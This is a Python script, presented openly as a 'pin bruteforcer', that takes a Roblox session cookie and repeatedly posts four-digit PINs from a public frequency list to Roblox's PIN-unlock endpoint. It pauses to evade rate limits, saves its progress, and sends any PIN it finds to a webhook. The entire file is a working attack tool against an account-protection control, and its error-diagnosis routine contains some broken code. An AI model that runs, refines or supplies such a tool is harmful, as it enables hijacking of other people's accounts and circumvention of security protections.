# --({ Import Modules })
import subprocess, requests, base64, json, time, os
try:
  from termcolor import cprint
except:
  try:
    import pip
  except ImportError:
      os.system("")
      print("[", end="")
      print('\033[31m'+" ERROR ", "red", end="")
      print("] " , end="")
      print('\033[31m'+"Pip not installed. Installing now...")
      subprocess.call("curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py", shell=True)
      time.sleep(5)
      os.system("get-pip.py")
  print("[", end="")
  print('\033[31m'+" ERROR ", "red", end="")
  print("] " , end="")
  print('\033[31m'+"Packages not installed. Installing now...")
  subprocess.call("pip install termcolor", shell=True)
finally:
  from termcolor import cprint
# --({ Get Xsrf Token }) -- #
def getXsrf(cookie):
    xsrfRequest = requests.post("https://auth.roblox.com/v2/logout", cookies={
        '.ROBLOSECURITY': cookie
    })
    return xsrfRequest.headers["x-csrf-token"]
# --({ Clear Console }) -- #
def clear():
  if os.name == 'nt':
    os.system("cls")
  else:
    os.system("clear")
# --({ Crack Pin }) -- #
class crack:
  # --({ Diagnose Errors }) -- #
  def __init__(self):
    self.cookie = None
    self.headers = None
    self.continueProgress = None
  def diagnose(self, error):
    print("[", end="")
    cprint(" ERROR ", "red", end="")
    print("] " , end="")
    print(f"ERROR {error}")
    try:
      cookie = self.cookie
      headers = {
      'X-CSRF-TOKEN': getXsrf(cookie),
      }
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] " , end="")
      cprint("Pin Bruteforcer Had A Fatal Error. Diagnosing issue", 'red')
      check = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
      response = check.json()
      if check.status_code ==503:
        print("[", end="")
        cprint("DIAGNOSTIC", "red", end="")
        print("] " , end="")
        cprint("Error found. Roblox is under maintenence", "red")
      elif response['errors'][0]['message'] == 'Authorization has been denied for this request.':
        print("[", end="")
        cprint("DIAGNOSTIC", "red", end="")
        print("] " , end="")
        cprint("Error found. Invalid Cookie. Close the program then re-enter the cookie and try again", "red")
      elif response['errors'][0]['message'] == 'Token Validation Failed':
        print("[", end="")
        cprint("DIAGNOSTIC", "red", end="")
        print("] " , end="")
        cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
      elif check.status_code ==404:
        print("[", end="")
        cprint("DIAGNOSTIC", "red", end="")
        print("] " , end="")
        cprint("Error found. Roblox's api endpoint may have changed", "red")
      print("[", end="")
      cprint("DIAGNOSTIC", "red", end="")
      print("] " , end="")
      cprint("Try re-running the program", 'red')
    except:
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] " , end="")
      print(f"Error occured with the program or your computer.")
  # --({ Check Cookie }) -- #
  def check(self):
    yes = ["y", "yes", "yeah", "ye"]
    print("[", end="")
    cprint(" BRUTEFORCER ", "magenta", end="")
    print("] ", end="")
    cprint(" Enter Your Cookie Below:", 'magenta')
    cookie = input("> ")
    print("[", end="")
    cprint(" BRUTEFORCER ", "magenta", end="")
    print("]", end="")
    cprint(" Enter Your Webhook Below:", 'magenta')
    webhook = input("> ")
    print("[", end="")
    cprint(" BRUTEFORCER ", "magenta", end="")
    print("]", end="")
    cprint(" Continue progress from last time? (Y or N)", 'magenta')
    continueProgress = input("> ")
    if not continueProgress or continueProgress.lower() in yes:
      continueProgress = True
    else:
      continueProgress = False
    check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
    if not check.status_code ==200:
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] ", end="")
      cprint("Invalid Cookie", "red")
      time.sleep(1)
      clear()
      self.check()
    self.cookie = cookie
    self.continueProgress = continueProgress
  # --({ Start Cracker }) -- #
  def start(self):
    # --({ Allow cprint to work in windows }) -- #
    os.system("")
    print("[", end="")
    # --({ Don't remove my credit })-- #
    cprint(base64.b64decode(b'IENSRURJVFMg').decode('utf-8'), "cyan", end="")
    print("]", end="")
    print(base64.b64decode(b'IE1hZGUgYnkgSWNlIEJlYXIjMDE2Nw==').decode('utf-8'))
    time.sleep(3)
    clear()
    self.check()
    continueProgress = self.continueProgress
    cookie = self.cookie
    # --({ Check for files }) -- #
    if not os.path.exists("progress.json"):
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] ", end="")
      cprint("Missing progress.json", "red")
      time.sleep(1)
      print("[", end="")
      cprint(" BRUTEFORCER ", "magenta", end="")
      print("] ", end="")
      cprint("Creating file now...", "magenta")
      open("progress.json", "w+").write("{\n\n}")
      print("[", end="")
      cprint(" BRUTEFORCER ", "magenta", end="")
      print("] ", end="")
      cprint("Done", "magenta")
      time.sleep(1)
    print("[", end="")
    cprint(" BRUTEFORCER ", "magenta", end="")
    print("] ", end="")
    for char in 'Cracking the pin....':
      time.sleep(0.03)
      cprint(char, 'magenta', end='', flush=True)
    print("")
    print("[", end="")
    cprint(" BRUTEFORCER ", "magenta", end="")
    print("] ", end="")
    for char in 'Leave this running for about around 5-29 days':
      time.sleep(0.03)
      cprint(char, 'magenta', end='', flush=True)
    cookies = {
    '.ROBLOSECURITY': cookie
    }
    userid = requests.get("https://users.roblox.com/v1/users/authenticated",cookies=cookies).json()['id']
    # --({ Try all the most common pins }) -- #
    time.sleep(1)
    clear()
    # --({ Start from progress saved }) -- #
    if continueProgress:
      try:
        startingLine = json.load(open("progress.json", "r"))[str(userid)]
      except KeyError:
        print("[", end="")
        cprint(" ERRORS ", "red", end="")
        print("] " , end="")
        cprint(f"There is no progress saved inside for this account progress.json", 'red')
        time.sleep(4)
        clear()
        self.check()
      except json.JSONDecodeError:
        print("[", end="")
        cprint(" ERRORS ", "red", end="")
        print("] " , end="")
        cprint(f"The data inside progress.json is not a json. Redownload the file from the github", 'red')
        time.sleep(4)
        clear()
        self.check()
      pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
    else:
      startingLine = 0
      pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]
    # --({ Update progress }) -- #
    for line, pin in enumerate(pins):
      print("[", end="")
      cprint(" BRUTEFORCER ", "magenta", end="")
      print("] " , end="")
      cprint(f"Trying {pin}...", "magenta")
      headers = {
      'X-CSRF-TOKEN': getXsrf(cookie),
      }
      progress = json.load(open("progress.json", "r"))
      with open("progress.json", "w+") as f:
        progress[str(userid)] = int(line+startingLine)
        json.dump(progress, f, indent=1)
      response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
      pin = pins[line]
      # --({ Check if the pin was found }) -- #
      try:
          if "unlockedUntil" in str(response):
            print("[", end="")
            cprint(" BRUTEFORCER ", "blue", end="")
            print("] " , end="")
            cprint("Cookie:", 'blue')
            print(cookie)
            print("[", end="")
            cprint(" BRUTEFORCER ", "green", end="")
            print("] " , end="")
            cprint(f"Pin found: {pin}", 'green')
            r = requests.post(webhook, data={'content':pin})
            if not r.status_code ==200:
              print("[", end="")
              cprint("ERROR", end="")
              print("] " , end="")
              cprint('Invalid Webhook', 'red')
            while True:
              pass
          if response['errors'][0]['code'] == 4:
            print("[", end="")
            cprint(" BRUTEFORCER ", "magenta", end="")
            print("] " , end="")
            cprint("Incorrect Pin", 'red')
          elif response['errors'][0]['message'] == "TooManyRequests":
            print("[", end="")
            cprint(" RATELIMIT ", "yellow", end="")
            print("] " , end="")
            cprint(f'Too many requests. Waiting 21 minutes before resumimg', 'yellow')
            time.sleep(1260)
          if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
            print("[", end="")
            cprint(" ERROR ", "red", end="")
            print("] " , end="")
            cprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "red")
            time.sleep(5)
            self.start()
            break
          elif response['errors'][0]['message'] == 'Token Validation Failed':
            print("[", end="")
            cprint(" ERROR ", "red", end="")
            print("] " , end="")
            cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
            time.sleep(5)
            self.start()
            break
      except Exception as e:
        print(f"A error has occured{e}")
    else:
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] " , end="")
      cprint("Invalid Cookie", 'red')
        
        

# --({ Start program }) -- #
if __name__ == "__main__":
  crack = crack()
  try:
    crack.start()
  except Exception as e:
    crack.diagnose(e)
